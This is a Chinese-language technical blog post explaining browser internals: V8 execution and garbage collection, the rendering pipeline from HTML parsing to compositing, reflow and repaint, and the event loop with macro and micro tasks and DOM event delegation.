<h2 id="JavaScript-引擎"><a href="#JavaScript-引擎" class="headerlink" title="JavaScript 引擎"></a>JavaScript 引擎</h2><p>V8 是 Google 打造的开源的，高性能的 JavaScript 和 WebAssembly 引擎，使用 C++语言实现。V8 引擎被应用在 Chrome、Nodejs 和其他应用中。V8 引擎可以独立运行，也可以运行在任何的 C++程序中。<br>一个 V8 的实例被称作 Isolate，每一个 isolate 都有<strong>独立 GC 的堆栈空间</strong>。这就意味着一个 Isolate 中的 JavaScript 对象不能直接访问另一个 Isolate 中的对象。<br>在 Chrome 中，每个渲染进程都有一个 V8 Isolate，所有被同一个渲染进程处理的站点的 JavaScript 代码在同一个 Isolate 中运行。但对于 Web worker，每一个 worker 则拥有自己的 Isolate。<br>在 Isolate 中，<strong>存在一个或多个 JavaScript 上下文环境</strong>（JavaScript content）。Chrome 为每个 iframe 创建一个 JavaScript 环境。此外，每个 Chrome extension 对于一个 iframe 都有自己的 JavaScript 环境。</p>
<h3 id="执行流水线"><a href="#执行流水线" class="headerlink" title="执行流水线"></a>执行流水线</h3><p><img src="https://cdn.nlark.com/yuque/0/2021/png/106384/1630294117788-8320e9a5-642d-435f-b248-30034b8c3166.png#clientId=u113a7264-6512-4&crop=0&crop=0&crop=1&crop=1&from=paste&id=u4e093d10&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1018&originWidth=1500&originalType=url%E2%88%B6=1&rotation=0&showTitle=false&size=154611&status=done&style=none&taskId=u07f81b7b-484c-40fe-aeef-eb04b738ddf&title=" alt="image.png"></p>
<ol>
<li>要运行的 JavaScript 脚本会从网络或缓存中被<strong>加载</strong>。</li>
<li>通过对 JavaScript 脚本文本的分析可以生成用于描述源代码结构化的数据，<strong>抽象语法树（AST）</strong>。</li>
<li>接下来 Ignition 解释器会将 AST 转化成生成体积更小的<strong>字节码</strong>，字节码中的每行指令代表着对寄存器的操作，当字节码生后以后 AST 将会被废弃以节省空间，后续的执行和优化都基于字节码。</li>
<li>在解释器<strong>执行</strong>字节码时，Object Shapes 会试图将代码中对象的类型<strong>缓存</strong>下来生成 Type Feedback，当访问这些对象时会尝试从缓存中获取，如果找不到再遍历原型链查找并更新缓存。</li>
<li>TurboFan 是 V8 中的代码优化编译器，以 Ignition 生成的字节码作为数据源。它会评估函数是否需要被进一步<strong>优化成机器码</strong>以提高性能，需要被优化的函数被编译成 Optimized Code。</li>
<li>但当编译后的函数被发现函数中变量的数据类型与之前缓存的类型不同时，则需要放弃优化的代码回到字节码重新解释执行。</li>
</ol>
<p>​</p>
<h3 id="内存管理-垃圾回收"><a href="#内存管理-垃圾回收" class="headerlink" title="内存管理/垃圾回收"></a>内存管理/垃圾回收</h3><p>V8 的垃圾回收器被称作 Orinoco。在一次垃圾回收过程中，Orinoco 通过对象的引用访问程序中的所有对象，那些回收器无法访问的对象所占用的内存会被回收掉。<br>Orinoco 将存放对象的堆空间分成新、老两个生代。新创建的对象被放在新生代中，存活时间较长的对象则被存放在老生代中。新生代的存储空间最大可以达到 32M，而老生代可以达到 2G。<br>除了对象的存储空间，还需要为用于执行的代码分配独立的内存空间。<br>V8 有着不同的垃圾回收策略：</p>
<ul>
<li>Minor GC（Scavenge）用于新生代</li>
<li>Major GC（Full Mark-Compact）用于整个堆空间</li>
</ul>
<h4 id=""><a href="#" class="headerlink" title=""></a><img src="https://cdn.nlark.com/yuque/0/2021/png/106384/1630294751637-f86dde3f-1d63-4fba-8f20-c2f9122911c8.png#clientId=u113a7264-6512-4&crop=0&crop=0&crop=1&crop=1&from=paste&id=hMqNr&margin=%5Bobject%20Object%5D&name=image.png&originHeight=737&originWidth=1500&originalType=url%E2%88%B6=1&rotation=0&showTitle=false&size=53372&status=done&style=none&taskId=uc1209169-ae9c-48d5-88c5-06fdb653fe0&title=" alt="image.png"></h4><h4 id="Minor-GC"><a href="#Minor-GC" class="headerlink" title="Minor GC"></a>Minor GC</h4><p>新生代中的内存空间被分成两个同样大的空间，一个用于放新创建的对象，另一个则是空的。<br>当 Minor GC 触发时会将对象区中可以被访问的对象复制到空闲区中，然后形成新的对象区和空闲区。<img src="https://cdn.nlark.com/yuque/0/2021/png/106384/1630294792434-60b77353-8e91-4c81-b793-839697616dbe.png#clientId=u113a7264-6512-4&crop=0&crop=0&crop=1&crop=1&from=paste&id=udb1baa48&margin=%5Bobject%20Object%5D&name=image.png&originHeight=526&originWidth=1398&originalType=url%E2%88%B6=1&rotation=0&showTitle=false&size=32481&status=done&style=none&taskId=ud5ac341f-35b9-4d63-a71d-84b28ae6195&title=" alt="image.png"><br>如果一个对象经历了两次 Minor GC 后依然存活则会被复制到老生代中。</p>
<h4 id="Major-GC"><a href="#Major-GC" class="headerlink" title="Major GC"></a>Major GC</h4><p><strong>标记（Marking）</strong><br>这个阶段 V8 会尝试访问所有的对象以标记那些<strong>可访问</strong>和<strong>不可访问</strong>的对象。<br><strong>压实（Compaction）</strong><br>压实是碎片整理的过程，由于复制对象是一种高成本的操作，所以 V8 只会压实那些高度碎片化的页（Page）<img src="https://cdn.nlark.com/yuque/0/2021/png/106384/1630294880224-c90c9dba-8160-4882-a861-e81d78206812.png#clientId=u113a7264-6512-4&crop=0&crop=0&crop=1&crop=1&from=paste&id=u45731a7a&margin=%5Bobject%20Object%5D&name=image.png&originHeight=642&originWidth=686&originalType=url%E2%88%B6=1&rotation=0&showTitle=false&size=34360&status=done&style=none&taskId=u95824653-0939-412f-90b2-7bb04198119&title=" alt="image.png"><br>在压实过程中，会将原本已经碎片化的页中的对象复制到新的页中。<br><strong>清除（Sweep）</strong><br>清除这个阶段会将页中无法访问的对象内存清空，同时在 Free List 中更新这些空白的区域。这个过程与压实过程基本上是同时开始的，对于那些不需要压实的页的不可访问对象的内存空间会直接清除掉。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/106384/1630294880148-b2bb01d9-2e64-4eb2-98a1-1ce4cc9e2943.png#clientId=u113a7264-6512-4&crop=0&crop=0&crop=1&crop=1&from=paste&id=u5e82d610&margin=%5Bobject%20Object%5D&name=image.png&originHeight=642&originWidth=1162&originalType=url%E2%88%B6=1&rotation=0&showTitle=false&size=48401&status=done&style=none&taskId=u7b15b72c-077f-4cc5-aa51-35b1190aed7&title=" alt="image.png"><br>如果 GC 工作完全在主线程上进行，则可能会对用户体验产生影响。<br>通常让垃圾回收兼顾低延迟和高吞吐是困难的，为了让垃圾回收过程不会阻塞主线程上其他的工作，V8 将整个垃圾回收过程以增量的方式拆分成多个阶段，这些不同阶段的回收过程可以穿插在主线程上其他的工作间隙处。与此同时，用多线程并行的方式让垃圾回收工作在非主线程上进行。</p>
<h2 id="渲染引擎"><a href="#渲染引擎" class="headerlink" title="渲染引擎"></a>渲染引擎</h2><h3 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h3><ol>
<li>解析 HTML 文本并构建 DOM 树</li>
<li>解析 CSS 文件并构建 StyleSheet 对象</li>
<li>样式计算并构建布局树</li>
<li>进行绘制</li>
</ol>
<h4 id="Webkit"><a href="#Webkit" class="headerlink" title="Webkit"></a>Webkit</h4><p><img src="https://cdn.nlark.com/yuque/0/2021/png/106384/1630304291937-e93b9c53-d62c-49ef-956c-e9b652bec6c3.png#clientId=u113a7264-6512-4&crop=0&crop=0&crop=1&crop=1&from=paste&id=u218f4c16&margin=%5Bobject%20Object%5D&name=image.png&originHeight=289&originWidth=624&originalType=url%E2%88%B6=1&rotation=0&showTitle=false&size=46679&status=done&style=none&taskId=u34bfc237-0683-441d-96ef-1e75e244626&title=" alt="image.png"></p>
<h4 id="Gecko"><a href="#Gecko" class="headerlink" title="Gecko"></a>Gecko</h4><p><img src="https://cdn.nlark.com/yuque/0/2021/png/106384/1630304456196-15f8bc8e-69b4-42f8-9dd3-b8de01140700.png#clientId=u113a7264-6512-4&crop=0&crop=0&crop=1&crop=1&from=paste&id=u4c4065f6&margin=%5Bobject%20Object%5D&name=image.png&originHeight=290&originWidth=624&originalType=url%E2%88%B6=1&rotation=0&showTitle=false&size=115588&status=done&style=none&taskId=u4cf4ad66-f68e-4186-9b01-689f31834d3&title=" alt="image.png"></p>
<h3 id="解析-HTML-并构建-DOM-树"><a href="#解析-HTML-并构建-DOM-树" class="headerlink" title="解析 HTML 并构建 DOM 树"></a>解析 HTML 并构建 DOM 树</h3><p>通过词法分析和语法分析，将 HTML 文本输出成有 ODM 元素和属性节点构成的树结构。根节点是 document。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/106384/1630305124219-98055709-7dd3-42f0-b013-a9fbdfdabcc3.png#clientId=u113a7264-6512-4&crop=0&crop=0&crop=1&crop=1&from=paste&id=u55c5877d&margin=%5Bobject%20Object%5D&name=image.png&originHeight=219&originWidth=400&originalType=url%E2%88%B6=1&rotation=0&showTitle=false&size=40228&status=done&style=none&taskId=uff1ceb45-23f1-4c4c-bb5b-7d5c1fef675&title=" alt="image.png"></p>
<p>HTML 无法用常规的自上而下或自下而上的解析器进行解析。原因在于：</p>
<ol>
<li> 语言的宽容本质。</li>
<li> 浏览器历来对一些常见的无效 HTML 用法采取包容态度。</li>
<li> 解析过程需要不断地反复。源内容在解析过程中通常不会改变，但是在 HTML 中，脚本标记如果包含 document.write，就会添加额外的标记，这样解析过程实际上就更改了输入内容。</li>
</ol>
<p>所以浏览器自定义解析器来解析 HTML，解析算法由两个阶段组成：标记化和树构建。</p>
<ol>
<li> 标记化是词法分析过程，将输入内容解析成多个标记。HTML 标记包括起始标记、结束标记、属性名称和属性值。</li>
<li> 标记生成器识别标记，传递给树构造器，然后接受下一个字符以识别下一个标记；如此反复直到输入的结束。</li>
</ol>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/106384/1630305328199-f219c807-afa0-43eb-a38d-235cd1cab7a9.png#clientId=u113a7264-6512-4&crop=0&crop=0&crop=1&crop=1&from=paste&id=u420a0dae&margin=%5Bobject%20Object%5D&name=image.png&originHeight=400&originWidth=308&originalType=url%E2%88%B6=1&rotation=0&showTitle=false&size=37534&status=done&style=none&taskId=u74337022-d7eb-4499-80ce-25acefc0591&title=" alt="image.png"></p>
<h4 id="脚本延迟解析"><a href="#脚本延迟解析" class="headerlink" title="脚本延迟解析"></a>脚本延迟解析</h4><p>DOM 解析器遇到 <script> 标记时立即解析并执行脚本。文档的解析将停止，直到脚本执行完毕。如果脚本是外部的，那么解析过程会停止，直到从网络同步抓取资源完成后再继续。<br><strong>defer</strong><br>defer 属性的 script 的下载不会阻塞 html 解析，而且其会在解析完成后才执行<br><img src="https://cdn.nlark.com/yuque/0/2021/png/106384/1630310902652-3d765e48-5336-456b-ba2e-d76666762190.png#clientId=u113a7264-6512-4&crop=0&crop=0&crop=1&crop=1&from=paste&id=u35dad29e&margin=%5Bobject%20Object%5D&name=image.png&originHeight=110&originWidth=720&originalType=url%E2%88%B6=1&rotation=0&showTitle=false&size=15741&status=done&style=none&taskId=u4aeb399e-62c3-47b5-a2df-7403e375312&title=" alt="image.png"><br><strong>async</strong><br>async 属性则是下载不会阻塞 html 解析，但是执行还是会阻塞。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/106384/1630310894281-23ca087d-40fd-4c31-b6cb-0a8bb37afb07.png#clientId=u113a7264-6512-4&crop=0&crop=0&crop=1&crop=1&from=paste&id=uc66c086f&margin=%5Bobject%20Object%5D&name=image.png&originHeight=110&originWidth=720&originalType=url%E2%88%B6=1&rotation=0&showTitle=false&size=16661&status=done&style=none&taskId=uc0b9a8d7-5d68-4969-9181-254677f3fd4&title=" alt="image.png"></p>
<h4 id="加载网络资源"><a href="#加载网络资源" class="headerlink" title="加载网络资源"></a>加载网络资源</h4><p>网页中常常包含诸如图片，CSS，JS 等额外的资源，这些资源需要从网络上或者 cache 中获取。主进程可以在构建 DOM 的过程中会逐一请求它们，为了加速 preload scanner （预加载）会同时运行，如果在 html 中存在 <img> <link> 等标签，preload scanner 会把这些请求传递给 Browser process 中的 network thread 进行相关资源的下载。<br>​</p>
<h3 id="解析-CSS-并构建-StyleSheet-对象"><a href="#解析-CSS-并构建-StyleSheet-对象" class="headerlink" title="解析 CSS 并构建 StyleSheet 对象"></a>解析 CSS 并构建 StyleSheet 对象</h3><p>根据 CSS 规则，CSS 解析器将 CSS 文件解析成 StyleSheet 对象，且每个对象都包含 CSS 规则。CSS 规则对象则包含选择器和声明对象，以及其他与 CSS 语法对应的对象。</p>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/106384/1630305851661-8b5f30ea-e15d-4e27-9731-7bae014f5332.png#clientId=u113a7264-6512-4&crop=0&crop=0&crop=1&crop=1&from=paste&id=ub2ab0451&margin=%5Bobject%20Object%5D&name=image.png&originHeight=393&originWidth=500&originalType=url%E2%88%B6=1&rotation=0&showTitle=false&size=53400&status=done&style=none&taskId=u8ca6f449-afe9-41df-9203-fd9ed35cb2d&title=" alt="image.png"></p>
<h4 id="处理脚本和样式表的顺序"><a href="#处理脚本和样式表的顺序" class="headerlink" title="处理脚本和样式表的顺序"></a>处理脚本和样式表的顺序</h4><p>样式表有着不同的表现。理论上，应用样式表不会更改 DOM 树，因此似乎没有必要等待样式表并停止文档解析。但这涉及到一个问题，假如脚本在文档解析阶段查询样式信息。（Window.getComputedStyle()、Element.getBoundingClientRect()）如果当时还没有加载和解析样式，脚本就会获得错误的答案。Firefox 在样式表加载和解析的过程中，会禁止所有脚本。而对于 WebKit 而言，仅当脚本尝试访问的样式属性可能受尚未加载的样式表影响时，它才会禁止该脚本。</p>
<h3 id="样式计算并构建布局树"><a href="#样式计算并构建布局树" class="headerlink" title="样式计算并构建布局树"></a>样式计算并构建布局树</h3><p>渲染引擎利用 DOM 树，以插入 DOM 节点的方式构建布局树。而布局树节点的视觉属性是通过计算每个节点的样式属性（内联样式、CSS 文件等）构建规则树来完成。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/106384/1630309064394-10cacbb6-04ef-49d7-bdd8-bfad43ec48c3.png#clientId=u113a7264-6512-4&crop=0&crop=0&crop=1&crop=1&from=paste&id=u29aad16a&margin=%5Bobject%20Object%5D&name=image.png&originHeight=984&originWidth=1142&originalType=url%E2%88%B6=1&rotation=0&showTitle=false&size=359335&status=done&style=none&taskId=u9c34dde4-70ed-4410-999f-73093f338bd&title=" alt="image.png"><br>渲染节点和 DOM 元素是相对应的，但并非一一对应，因为不可见的元素不会插入布局树中，如 head 元素和 display: none;的元素（visibility: hidden 会显示）。另外一些复杂的 DOM 元素对应多个渲染节点，如 select 对应显示区域、下拉列表、按钮。<br>​</p>
<h4 id="共享样式上下文"><a href="#共享样式上下文" class="headerlink" title="共享样式上下文"></a>共享样式上下文</h4><p>在计算某个特定元素的样式上下文时，我们首先<strong>计算规则树中的对应路径</strong>，或者使用现有的路径。然后我们沿此路径应用规则，在新的样式上下文中填充结构。我们从路径中拥有最高优先级的底层节点（通常也是最特殊的选择器）开始，并向上遍历规则树，直到结构填充完毕。如果在那个规则节点没有定义所需的结构规则，则沿着路径向上，直到找到该结构规则。<br>　如果最终没有找到该结构的任何规则定义，那么如果这个结构是继承型的，则找到其在内容树中的 parent 的结构，这种情况下，我们也成功的共享了结构；如果这个结构是 reset 型的，则使用默认的值。如果特定的节点添加了值，那么需要做一些额外的计算以将其转换为实际值，然后在树上的节点缓存该值，使它的 children 可以使用。这是最好的优化方法，因为整个结构都能共享，可以减少计算量并节约内存。<br>​</p>
<h4 id="布局计算"><a href="#布局计算" class="headerlink" title="布局计算"></a>布局计算</h4><p>布局树节点创建完成并加入布局树时，并不包括位置和大小信息，计算这些坐标位置的过程称为布局或重排。<br>HTML 才有基于流的布局模型，大多数情况下一次遍历就能计算出几何信息。由于流中后面元素通常不影响前面元素的几何属性，布局时可以从 HTML 元素开始，从左到右、从上到下递归遍历文档。<br>布局流程通常如下：</p>
<ol>
<li> 父元素确定自己的宽度</li>
<li>父元素依次处理子元素<ol>
<li>设置子元素的 x,y 坐标</li>
<li>递归布局子元素，并确定子元素高度</li>
</ol>
</li>
<li> 父元素根据子元素高度和边距设置自己高度，提供给自己的父元素</li>
<li> 完成布局</li>
</ol>
<p>​</p>
<h3 id="绘制"><a href="#绘制" class="headerlink" title="绘制"></a>绘制</h3><p>遍历布局树节点并调用 paint 方法，将内容渲染在屏幕上。绘制工作是使用用户界面基础组件完成的。</p>
<h4 id="分层"><a href="#分层" class="headerlink" title="分层"></a>分层</h4><p>完成布局树后页面中还有很多复杂的效果，如一些复杂的 3D 变换、页面滚动，或者使用 z-indexing 做 z 轴排序等，为了更加方便地实现这些效果，渲染引擎还需要为特定的节点生成专用的图层，并生成一棵对应的图层树（LayerTree）<br><img src="https://cdn.nlark.com/yuque/0/2021/png/106384/1630309179897-6110c31c-637e-44fe-8fd3-ca723516456f.png#clientId=u113a7264-6512-4&crop=0&crop=0&crop=1&crop=1&from=paste&id=ub20ba489&margin=%5Bobject%20Object%5D&name=image.png&originHeight=674&originWidth=1142&originalType=url%E2%88%B6=1&rotation=0&showTitle=false&size=155520&status=done&style=none&taskId=u56a6f2b1-2e47-4a18-ab40-d29becf9afa&title=" alt="image.png"><br>以下条件会单独提升为一个图层：</p>
<ol>
<li>拥有层叠上下文属性的元素会被提升为单独的一层（明确定位属性的元素、定义透明属性的元素、使用 CSS 滤镜的元素等，都拥有层叠上下文属性）</li>
</ol>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/106384/1630309265731-be3b9686-569d-40c5-819f-fde291865a55.png#clientId=u113a7264-6512-4&crop=0&crop=0&crop=1&crop=1&from=paste&id=Sj1fI&margin=%5Bobject%20Object%5D&name=image.png&originHeight=601&originWidth=1142&originalType=url%E2%88%B6=1&rotation=0&showTitle=false&size=55305&status=done&style=none&taskId=uc22ea8bf-33a6-4071-be8d-a4a3c86f59a&title=" alt="image.png"></p>
<ol start="2">
<li>需要剪裁的地方（出现这种时，渲染引擎会为文字部分单独创建一个层，如果出现滚动条，滚动条也会被提升为单独的层）</li>
</ol>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/106384/1630309334488-30ebbc07-d6c1-435f-a733-f0a32d870e80.png#clientId=u113a7264-6512-4&crop=0&crop=0&crop=1&crop=1&from=paste&id=TW7sj&margin=%5Bobject%20Object%5D&name=image.png&originHeight=403&originWidth=1142&originalType=url%E2%88%B6=1&rotation=0&showTitle=false&size=91673&status=done&style=none&taskId=u8fe12870-29d1-457f-995c-40626b78ef9&title=" alt="image.png"><br>渲染引擎在绘制图层是，会把一个图层的绘制拆分成很多小的绘制指令，并按顺序组成绘制列表<br><img src="https://cdn.nlark.com/yuque/0/2021/png/106384/1630310549810-550f520d-3d7b-4eae-befb-8885a8be5b5d.png#clientId=u113a7264-6512-4&crop=0&crop=0&crop=1&crop=1&from=paste&id=ua78bec85&margin=%5Bobject%20Object%5D&name=image.png&originHeight=603&originWidth=1142&originalType=url%E2%88%B6=1&rotation=0&showTitle=false&size=119331&status=done&style=none&taskId=ua5fa50e2-2d8f-4108-9beb-74d177cd636&title=" alt="image.png"></p>
<h4 id="栅格化（raster"><a href="#栅格化（raster" class="headerlink" title="栅格化（raster)"></a>栅格化（raster)</h4><p>得到绘制列表后，实际进行绘制的是渲染引擎中的合成线程。合成线程会把图层划分为稍大于 viewport 的图块，栅格化生成优先显示的位图。通常，栅格化过程都会使用 GPU 来加速生成，使用 GPU 生成位图的过程叫快速栅格化，或者 GPU 栅格化，生成的位图被保存在 GPU 内存中。</p>
<h4 id="合成和显示"><a href="#合成和显示" class="headerlink" title="合成和显示"></a>合成和显示</h4><p>一旦所有图块都被光栅化，合成线程就会生成一个绘制图块的命令——“DrawQuad”，然后将该命令提交给浏览器进程。<br>浏览器进程里面有一个叫 viz 的组件，用来接收合成线程发过来的 DrawQuad 命令，然后根据 DrawQuad 命令，将其页面内容绘制到内存中，最后再将内存显示在屏幕上。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>从 HTML 到 DOM、样式计算、布局、图层、绘制、光栅化、合成和显示<br><img src="https://cdn.nlark.com/yuque/0/2021/png/106384/1630309465809-f7e74b91-fb99-4a14-8bf1-a19de4c46fb2.png#clientId=u113a7264-6512-4&crop=0&crop=0&crop=1&crop=1&from=paste&id=ud18f5ca7&margin=%5Bobject%20Object%5D&name=image.png&originHeight=745&originWidth=1142&originalType=url%E2%88%B6=1&rotation=0&showTitle=false&size=171553&status=done&style=none&taskId=u1bbe33ac-8a5e-40a5-88c2-6fd8b771faf&title=" alt="image.png"></p>
<h3 id="重排-重绘-合成"><a href="#重排-重绘-合成" class="headerlink" title="重排/重绘/合成"></a>重排/重绘/合成</h3><h4 id="重排"><a href="#重排" class="headerlink" title="重排"></a>重排</h4><p>如果你通过 JavaScript 或者 CSS 修改元素的几何位置属性，例如改变元素的宽度、高度等，那么浏览器会触发重新布局，解析之后的一系列子阶段，这个过程就叫重排。无疑，重排需要更新完整的渲染流水线，所以开销也是最大的<img src="https://cdn.nlark.com/yuque/0/2021/png/106384/1630311146170-8b21f1de-877b-45ea-aea5-e81ae2eef053.png#clientId=u113a7264-6512-4&crop=0&crop=0&crop=1&crop=1&from=paste&id=u49cb6d0b&margin=%5Bobject%20Object%5D&name=image.png&originHeight=318&originWidth=1142&originalType=url%E2%88%B6=1&rotation=0&showTitle=false&size=104562&status=done&style=none&taskId=u0b887072-72ea-4c74-8acb-a4df1540415&title=" alt="image.png"></p>
<h4 id="重绘"><a href="#重绘" class="headerlink" title="重绘"></a>重绘</h4><p>通过 JavaScript 更改某些元素的背景颜色，没有引发几何位置变化，会跳过布局阶段和分层进行绘制，效率要更高一点<br><img src="https://cdn.nlark.com/yuque/0/2021/png/106384/1630311150220-e6c4edf7-dde7-438b-bc5c-c7ec5fc89f10.png#clientId=u113a7264-6512-4&crop=0&crop=0&crop=1&crop=1&from=paste&id=u3ecf8261&margin=%5Bobject%20Object%5D&name=image.png&originHeight=286&originWidth=1142&originalType=url%E2%88%B6=1&rotation=0&showTitle=false&size=109134&status=done&style=none&taskId=uf8b62f34-f71a-4b32-bd70-36d58016d01&title=" alt="image.png"></p>
<h4 id="合成"><a href="#合成" class="headerlink" title="合成"></a>合成</h4><p>使用了 CSS 的 transform 来实现动画效果，这可以避开重排和重绘阶段，直接在非主线程上执行合成动画操作。这样的效率是最高的，因为是在非主线程上合成，并没有占用主线程的资源，另外也避开了布局和绘制两个子阶段，所以相对于重绘和重排，合成能大大提升绘制效率<br><img src="https://cdn.nlark.com/yuque/0/2021/png/106384/1630311129504-00f54247-cd11-494b-9d54-eef29a7c7961.png#clientId=u113a7264-6512-4&crop=0&crop=0&crop=1&crop=1&from=paste&id=u8d3555cf&margin=%5Bobject%20Object%5D&name=image.png&originHeight=270&originWidth=1142&originalType=url%E2%88%B6=1&rotation=0&showTitle=false&size=101949&status=done&style=none&taskId=u58cb7208-c641-415a-a70b-60764fcdba9&title=" alt="image.png"></p>
<h2 id="消息队列-事件循环"><a href="#消息队列-事件循环" class="headerlink" title="消息队列/事件循环"></a>消息队列/事件循环</h2><p>​</p>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/106384/1630313082573-8393bc9c-ea8b-4a85-b090-706d8eae8749.png#clientId=u113a7264-6512-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=405&id=u54d75a3c&margin=%5Bobject%20Object%5D&name=image.png&originHeight=405&originWidth=672&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&size=105100&status=done&style=none&taskId=u505fe992-363f-4063-a525-597a4cf88bd&title=&width=672" alt="image.png"><br>添加一个消息队列；<br>IO 线程中产生的新任务添加进消息队列尾部；<br>渲染主线程会循环地从消息队列头部中读取任务，执行任务。<br>​</p>
<h3 id="宏微任务"><a href="#宏微任务" class="headerlink" title="宏微任务"></a>宏微任务</h3><p><img src="https://cdn.nlark.com/yuque/0/2022/png/106384/1641960014677-21ffab35-a065-4e66-bbc4-53f7ff16251e.png#clientId=udba9285f-e51a-4&crop=0&crop=0&crop=1&crop=1&from=paste&id=u15c8a029&margin=%5Bobject%20Object%5D&name=image.png&originHeight=380&originWidth=720&originalType=url%E2%88%B6=1&rotation=0&showTitle=false&size=110713&status=done&style=none&taskId=uf6e9d28d-6c4e-4aa4-8f89-32653adb0d0&title=" alt="image.png"><br>通常我们把消息队列中的任务称为宏任务，每个宏任务中都包含了一个微任务队列，等宏任务中的任务完成之后，这时候，渲染引擎并不执行下一个宏任务，而是执行当前宏任务的微任务队列中的所有任务。</p>
<ul>
<li>微任务和宏任务是绑定的，每个宏任务在执行时，会创建自己的微任务队列。</li>
<li>微任务的执行时长会影响到当前宏任务的时长。</li>
<li>在一个宏任务中，分别创建一个用于回调的宏任务和微任务，无论什么情况下，微任务都早于回调宏任务执行（setTimeout Promise.then()）</li>
</ul>
<h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><ul>
<li>宏任务：页面的渲染事件、各种 IO 的完成事件、执行 JavaScript 脚本的事件、用户交互的事件、setTimeout 的回调函数</li>
<li>微任务：MutationObserver、Promise</li>
</ul>
<p>​</p>
<h3 id="定时器"><a href="#定时器" class="headerlink" title="定时器"></a>定时器</h3><p>渲染进程中所有运行在主线程上的任务都需要先添加到消息队列，然后事件循环系统再按照顺序执行消息队列中的任务。<br>所以说要执行一段异步任务，需要先将任务添加到消息队列中。不过通过定时器设置回调函数有点特别，它们需要在指定的时间间隔内被调用，但消息队列中的任务是按照顺序执行的，所以为了保证回调函数能在指定时间内执行，你不能将定时器的回调函数直接添加到消息队列中。<br>在 Chrome 中除了正常使用的消息队列之外，还有另外一个消息队列，这个队列中维护了需要延迟执行的任务列表，包括了定时器和 Chromium 内部一些需要延迟执行的任务。所以当通过 JavaScript 创建一个定时器时，渲染进程会将该定时器的回调任务添加到延迟队列中<br>当通过 JavaScript 调用 setTimeout 设置回调函数的时候，渲染进程将会创建一个回调任务，包含了回调函数、当前发起时间、延迟执行时间。创建好回调任务之后，再将该任务添加到延迟执行队列中。这时已经完成一个宏任务。<br>每个宏任务处理完之后，其所属微任务队列执行之前，会调用专门函数根据发起时间和延迟时间计算出到期的任务，并依次执行。所以如果当前任务执行时间过久，会影延迟到期定时器任务的执行。<br>​</p>
<p>​</p>
<h3 id="同步回调和异步回调"><a href="#同步回调和异步回调" class="headerlink" title="同步回调和异步回调"></a>同步回调和异步回调</h3><p>同步回调就是在当前主函数的上下文中执行回调函数<br>​</p>
<p>异步回调一般有两种方式：</p>
<ol>
<li> 把异步回调当做一个宏任务，添加到消息队列尾部</li>
</ol>
<p>new XMHttpRequest().onreadystatechange()</p>
<ol start="2">
<li> 把异步函数添加到微任务队列中，就可以在当前任务末尾执行微回调</li>
</ol>
<p>Promise.then()?<br>​</p>
<h2 id="事件模型"><a href="#事件模型" class="headerlink" title="事件模型"></a>事件模型</h2><p>​</p>
<p>当用户与页面发生交互时，浏览器进程首先接收到事件，然而，浏览器进程只关心事件发生时是在哪个页签中，所以<strong>浏览器进程</strong>会将事件类型和位置信息等发送给负责当前页签的<strong>渲染进程</strong>的<strong>合成线程</strong>，再根据事件监听的区域决定是否要传递给渲染进程的<strong>主线程</strong>处理。当渲染线程将事件发送给主线程后，第一件事就是找到事件触发的目标。通过在渲染过程中生成的绘制信息，可以根据坐标找到目标元素并且触发事件监听器。<br>​</p>
<h3 id="事件流"><a href="#事件流" class="headerlink" title="事件流"></a>事件流</h3><pre><code>DOM结构是一个树型结构，当一个HTML元素产生一个事件时，该事件会在元素结点与根结点之间的路径传播，路径所经过的结点都会收到该事件，这个传播过程可称为DOM事件流。IE最开始实现实现事件流的方式：冒泡事件(event bubbling)，Netscape提出了另外一种事件流方式：事件捕获(event capturing)。W3C制定的&quot;DOM2级事件addEventListener&quot;，&quot;DOM2级事件&quot;把事件流分为三个阶段：捕获阶段、目标阶段、冒泡阶段：
</code></pre>
<ol>
<li>事件捕获阶段。即由最顶层元素，逐次进入 dom 内部，最后到达目标元素，依次执行绑定在其上的事件。</li>
<li>处于目标阶段。检测机制到达目标元素，按事件注册顺序执行绑定在目标元素上的事件。</li>
<li>事件冒泡阶段。从目标元素出发，向外层元素冒泡，最后到达顶层（window 或 document），依次执行绑定再其上的事件。（addEventListener 默认）</li>
</ol>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/106384/1630315213711-0a38be24-ba65-4a56-9741-4022c66b214f.png#clientId=u113a7264-6512-4&crop=0&crop=0&crop=1&crop=1&from=paste&id=u20c1284f&margin=%5Bobject%20Object%5D&originHeight=486&originWidth=540&originalType=url%E2%88%B6=1&rotation=0&showTitle=false&status=done&style=none&taskId=u80ac06f6-3c25-4ed2-ae78-06734ccd5ae&title="></p>
<h3 id="事件代理-委托"><a href="#事件代理-委托" class="headerlink" title="事件代理/委托"></a>事件代理/委托</h3><p>给祖先元素绑定事件，操作后代元素时，会利用事件流的原理触发祖先元素的事件，并根据 target 属性进行具体元素的区分。 事件代理是基于<strong>事件冒泡</strong>。避免给过多的子元素添加同一事件，影响性能。后期新添加的子元素也能触发事件。<br>并但不是说把事件委托给的元素越靠近顶层就越好。事件冒泡的过程也需要耗时，越靠近顶层，事件的”事件传播链”越长，也就越耗时。如果 DOM 嵌套结构很深，事件冒泡通过大量祖先元素会导致性能损失。<br>​</p>
